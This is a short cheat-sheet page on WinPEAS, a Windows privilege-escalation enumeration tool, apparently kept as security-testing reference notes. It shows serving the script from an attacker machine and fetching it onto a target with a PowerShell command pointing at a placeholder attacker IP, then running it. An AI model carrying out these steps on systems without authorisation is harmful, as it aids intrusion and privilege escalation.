---
title: WinPEAS
desc: Enumerate for Windows privilege escalation.
tags: [PrivEsc, Windows]
alts: [LinPEAS, WindowsPrivEsc]
website: https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
render_with_liquid: false
---

## Basic Usage

```sh
# On attack machine

# Download WinPEAS.bat
wget https://github.com/carlospolop/PEASS-ng/releases/download/20220710/winPEAS.bat

# Open local server
python3 -m http.server 8000

# -----------------------------------------------------------------

# On target windows machine

# Transfer WinPEAS.bat with PowerShell
cd \Users\<user-name>\Desktop
powershell
Invoke-WebRequest -Uri http://<attacker-ip>:8000/winPEAS.bat -OutFile .\winPEAS.bat

# Execute
winPEAS.bat
```
